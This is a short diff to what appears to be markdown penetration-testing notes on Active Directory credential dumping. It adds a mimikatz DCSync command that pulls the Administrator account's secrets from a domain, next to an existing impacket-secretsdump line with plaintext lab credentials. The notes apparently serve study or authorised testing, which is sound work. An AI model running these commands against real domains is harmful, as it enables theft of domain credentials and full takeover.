@@ -375,6 +375,12 @@ impacket-secretsdump  -just-dc mag.bekki:ncc1701@192.168.232.129 -outputfile dcs
 
 <img width="967" height="336" alt="image" src="https://github.com/user-attachments/assets/5d3a517e-b5b5-42b1-8dc2-f0b4f7d00257" />
 
+- Dumping locally-:
+
+```cmd
+.\mimikatz.exe
+lsadump::dcsync /user:Administrator /domain:cs.org
+```
 - Others
 
 ```bash
